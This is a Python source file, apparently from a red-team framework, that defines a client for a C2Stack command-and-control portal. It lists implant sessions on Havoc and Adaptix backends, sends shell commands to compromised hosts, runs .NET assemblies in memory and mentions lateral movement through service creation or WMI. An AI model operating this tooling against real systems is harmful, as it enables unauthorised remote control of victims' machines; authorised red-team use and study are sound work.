from __future__ import annotations

import json
import os
import time
from datetime import datetime, timezone
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

from redstrike.c2.base import BaseC2Client
from redstrike.core.models import C2Backend, C2Session, CommandResult
from redstrike.core.runner import redact_argv

_DEFAULT_TIMEOUT = 30
_POLL_INTERVAL = 5

# Backends whose operator surface is the C2Stack Flight Control portal. The
# frameworks with a direct operator protocol (sliver CLI, meridian CLI,
# mythic REST) keep their dedicated adapters; havoc has no REST API at all
# (raw WebSocket+TLS operator protocol) and adaptix's REST API lives on the
# self-signed :4321 endpoint — both are first-class backends of the portal.
PORTAL_BACKENDS = (C2Backend.HAVOC, C2Backend.ADAPTIX)


class PortalClient(BaseC2Client):
    """Client adapter that drives C2Stack's Flight Control portal (port 8000).

    Contract (verified live against the C2Stack v3.1.0 portal, 2026-10-04):
      * ``GET /api/ops/sessions`` -> ``{"count", "sessions": [...],
        "backends": {<name>: {"ok": bool, ...}}}``. Session entries carry
        ``{"id", "backend", "hostname", "username", "os", "pid", ...}`` and
        per-backend errors are reported in ``backends[<name>]["error"]``
        (nothing is invented for unreachable backends).
      * ``POST /api/ops/task`` with ``{"session_id", "backend", "command",
        "wait"}`` dispatches a framework-native command line:
          - havoc: catalogue vocabulary (shell/ls/ps/net/token/dotnet/...);
            unknown lines fall through to `shell`. The portal collects output
            over the ``wait`` window and returns
            ``result.output`` / ``result.errors``.
          - adaptix: AxScript (shell/powershell/bof/ls/ps/...). The portal
            only QUEUES the command; results are polled from
            ``GET /api/ops/adaptix/results?agent_id=<id>`` whose entries carry
            ``a_task_id`` / ``a_text``.
      * Havoc in-memory .NET execution is the ``dotnet <path> [args]`` task;
        the assembly path must be readable INSIDE the portal container
        (stage it with ``docker cp <assembly> c2stack-portal-1:/tmp/``) —
        the portal reads the file and ships it base64 (AssemblyInlineExecute).
      * The portal endpoint is unauthenticated and lab-local by design
        (C2Stack binds it to the operator host); do not expose it.

    The adapter is intentionally stdlib-only (urllib), like the mythic
    adapter, so C2 tasking adds no dependencies.
    """

    def __init__(
        self,
        backend: C2Backend = C2Backend.HAVOC,
        endpoint: str | None = None,
        timeout_seconds: int = 120,
        wait_seconds: int = 25,
    ) -> None:
        if isinstance(backend, str):
            backend = C2Backend(backend)
        if backend not in PORTAL_BACKENDS:
            raise ValueError(
                f"PortalClient drives {', '.join(b.value for b in PORTAL_BACKENDS)} "
                f"only; use the dedicated adapter for {backend.value}"
            )
        self.backend = backend
        self.endpoint = (
            endpoint
            or os.environ.get("C2STACK_PORTAL_URL")
            or "http://127.0.0.1:8000"
        ).rstrip("/")
        self.timeout_seconds = timeout_seconds
        self.wait_seconds = wait_seconds
        self.last_error: str | None = None

    # ------------------------------------------------------------------ HTTP
    def _get_json(self, path: str, timeout: int = _DEFAULT_TIMEOUT) -> dict[str, Any] | None:
        req = Request(self.endpoint + path, method="GET")
        try:
            with urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode("utf-8", errors="replace"))
        except HTTPError as exc:
            return {"ok": False, "error": f"HTTP {exc.code}: {exc.read().decode('utf-8', errors='replace')[:200]}"}
        except (URLError, OSError, json.JSONDecodeError) as exc:
            return {"ok": False, "error": str(exc)}

    def _post_json(self, path: str, payload: dict[str, Any], timeout: int = 60) -> dict[str, Any] | None:
        body = json.dumps(payload).encode()
        req = Request(
            self.endpoint + path,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode("utf-8", errors="replace"))
        except HTTPError as exc:
            return {"ok": False, "error": f"HTTP {exc.code}: {exc.read().decode('utf-8', errors='replace')[:200]}"}
        except (URLError, OSError, json.JSONDecodeError) as exc:
            return {"ok": False, "error": str(exc)}

    # ------------------------------------------------------------- interface
    def list_sessions(self) -> list[C2Session]:
        data = self._get_json("/api/ops/sessions")
        if not isinstance(data, dict):
            self.last_error = "unreachable"
            return []
        if not data.get("ok", True):
            self.last_error = str(data.get("error") or "portal error")
            return []
        backend_info = (data.get("backends") or {}).get(self.backend.value)
        if isinstance(backend_info, dict) and backend_info.get("ok") is False:
            self.last_error = str(backend_info.get("error") or f"backend {self.backend.value} unavailable")
            return []
        self.last_error = None
        sessions: list[C2Session] = []
        for entry in data.get("sessions") or []:
            if entry.get("backend") != self.backend.value:
                continue
            last_seen = datetime.now(timezone.utc)
            raw_ts = entry.get("last_seen")
            if isinstance(raw_ts, (int, float)) and raw_ts > 0:
                last_seen = datetime.fromtimestamp(raw_ts, tz=timezone.utc)
            sessions.append(
                C2Session(
                    id=str(entry.get("id") or ""),
                    backend=self.backend,
                    hostname=entry.get("hostname") or "unknown",
                    username=entry.get("username") or "unknown",
                    os=entry.get("os") or "windows",
                    transport=entry.get("listener") or entry.get("transport") or "http",
                    last_seen=last_seen,
                    is_alive=bool(entry.get("is_alive", True)),
                    remote_address=entry.get("internal_ip") or entry.get("remote"),
                )
            )
        return sessions

    def shell(
        self,
        session_id: str,
        command: str,
        timeout_seconds: int = 60,
    ) -> CommandResult:
        display_cmd = [f"c2stack-portal:{self.backend.value}", "task", session_id, command]
        started = time.monotonic()
        if self.backend == C2Backend.ADAPTIX:
            return self._shell_adaptix(session_id, command, timeout_seconds, display_cmd, started)
        payload = {
            "session_id": session_id,
            "backend": self.backend.value,
            "command": command,
            "wait": min(timeout_seconds, max(self.wait_seconds, 5)),
        }
        data = self._post_json("/api/ops/task", payload, timeout=payload["wait"] + 60)
        if not isinstance(data, dict):
            return CommandResult(
                command=redact_argv(display_cmd),
                return_code=1,
                stdout="",
                stderr="portal /api/ops/task returned no JSON",
                duration_seconds=time.monotonic() - started,
            )
        if data.get("ok") is False or data.get("error"):
            return CommandResult(
                command=redact_argv(display_cmd),
                return_code=1,
                stdout="",
                stderr=str(data.get("error") or "portal task failed"),
                duration_seconds=time.monotonic() - started,
            )
        result = data.get("result") or {}
        output = str(result.get("output") or "")
        errors = str(result.get("errors") or "")
        return CommandResult(
            command=redact_argv(display_cmd),
            return_code=1 if errors else 0,
            stdout=output,
            stderr=errors,
            duration_seconds=time.monotonic() - started,
        )

    def _shell_adaptix(
        self,
        session_id: str,
        command: str,
        timeout_seconds: int,
        display_cmd: list[str],
        started: float,
    ) -> CommandResult:
        """Adaptix queues AxScript commands; output lands in the task list."""
        known_ids = self._adaptix_task_ids(session_id)
        data = self._post_json(
            "/api/ops/task",
            {"session_id": session_id, "backend": "adaptix", "command": command},
        )
        if not isinstance(data, dict):
            return CommandResult(
                command=redact_argv(display_cmd),
                return_code=1,
                stdout="",
                stderr="portal /api/ops/task returned no JSON",
                duration_seconds=time.monotonic() - started,
            )
        if data.get("ok") is False or data.get("error"):
            return CommandResult(
                command=redact_argv(display_cmd),
                return_code=1,
                stdout="",
                stderr=str(data.get("error") or "portal task failed"),
                duration_seconds=time.monotonic() - started,
            )

        expected_task_id = str(data.get("task_id") or (data.get("result") or {}).get("task_id") or "")
        deadline = started + max(timeout_seconds, 10)
        while time.monotonic() < deadline:
            for task in self._adaptix_tasks(session_id):
                task_id = str(task.get("a_task_id") or "")
                if not task_id:
                    continue
                if expected_task_id:
                    if task_id != expected_task_id:
                        continue
                elif task_id in known_ids:
                    continue
                status = str(task.get("a_status") or "").lower()
                if status in ("queued", "pending", "running"):
                    continue
                out = str(task.get("a_text") or task.get("a_message") or "")
                err = str(task.get("a_error") or "")
                rc = 1 if (err or status in ("failed", "error")) else 0
                return CommandResult(
                    command=redact_argv(display_cmd),
                    return_code=rc,
                    stdout=out,
                    stderr=err,
                    duration_seconds=time.monotonic() - started,
                )
            time.sleep(_POLL_INTERVAL)
        return CommandResult(
            command=redact_argv(display_cmd),
            return_code=124,
            stdout="",
            stderr=f"no completed adaptix task for {session_id} within {timeout_seconds}s (beacon interval)",
            duration_seconds=time.monotonic() - started,
            timed_out=True,
        )

    def _adaptix_tasks(self, agent_id: str) -> list[dict[str, Any]]:
        data = self._get_json(f"/api/ops/adaptix/results?agent_id={agent_id}&limit=25")
        tasks = data.get("tasks") if isinstance(data, dict) else None
        return tasks if isinstance(tasks, list) else []

    def _adaptix_task_ids(self, agent_id: str) -> set[str]:
        ids: set[str] = set()
        for task in self._adaptix_tasks(agent_id):
            tid = str(task.get("a_task_id") or "")
            if tid:
                ids.add(tid)
        return ids

    def execute_assembly(
        self,
        session_id: str,
        assembly: str,
        args: list[str] | None = None,
        timeout_seconds: int = 120,
    ) -> CommandResult:
        display_cmd = [
            f"c2stack-portal:{self.backend.value}", "execute-assembly",
            session_id, assembly,
        ] + (args or [])
        if self.backend == C2Backend.ADAPTIX:
            return CommandResult(
                command=redact_argv(display_cmd),
                return_code=2,
                stdout="",
                stderr=(
                    "adaptix AxScript has no .NET assembly loader (catalogue: shell/"
                    "powershell/bof/...). Use the havoc backend (dotnet), the mythic "
                    "backend (execute_assembly), or an adaptix `bof` task."
                ),
                duration_seconds=0.0,
            )
        if not assembly:
            return CommandResult(
                command=redact_argv(display_cmd),
                return_code=2,
                stdout="",
                stderr="no assembly path provided",
                duration_seconds=0.0,
            )
        cmdline = " ".join(["dotnet", assembly] + (args or []))
        return self.shell(session_id, cmdline, timeout_seconds)

    def psexec(
        self,
        session_id: str,
        target: str,
        service_name: str,
        bin_path: str,
        timeout_seconds: int = 120,
    ) -> CommandResult:
        display_cmd = [
            f"c2stack-portal:{self.backend.value}", "psexec",
            session_id, target, service_name,
        ]
        return CommandResult(
            command=redact_argv(display_cmd),
            return_code=2,
            stdout="",
            stderr=(
                f"{self.backend.value} has no psexec task through the portal; queue "
                "framework-native lateral movement via shell() instead (e.g. "
                "`shell sc \\\\target create ...` or a WMI launch)."
            ),
            duration_seconds=0.0,
        )

    # ---------------------------------------------------------------- extras
    def catalogue(self) -> dict[str, Any] | None:
        """Per-framework tasking vocabulary from the portal (OPSEC-safe lookup)."""
        data = self._get_json("/api/ops/catalogues")
        if not isinstance(data, dict):
            return None
        return data.get(self.backend.value)
